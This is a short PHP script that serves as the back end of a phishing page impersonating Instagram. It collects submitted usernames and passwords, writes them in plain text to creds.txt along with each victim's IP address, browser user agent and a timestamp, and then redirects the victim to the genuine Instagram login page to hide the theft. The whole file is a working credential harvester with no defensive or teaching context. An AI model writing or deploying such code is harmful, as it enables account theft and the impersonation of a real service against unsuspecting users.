<?php
$credsFile = __DIR__ . '/creds.txt';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = trim($_POST['username'] ?? '');
    $password = trim($_POST['password'] ?? '');

    if ($username === '' || $password === '') {
        header('Location: index.php?error=' . urlencode('Please fill both fields'));
        exit;
    }

    // Get IP address
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown IP';

    // Get User-Agent
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown UA';

    // Prepare log entry
    $entry = "[" . date('Y-m-d H:i:s') . "] IP: $ip | UA: $userAgent | Username: $username | Password: $password\n";

    // Save credentials
    file_put_contents($credsFile, $entry, FILE_APPEND);

    // Redirect to real Instagram login page
    header('Location: https://www.instagram.com/accounts/login/');
    exit;
}

header('Location: index.php');
exit;
?>

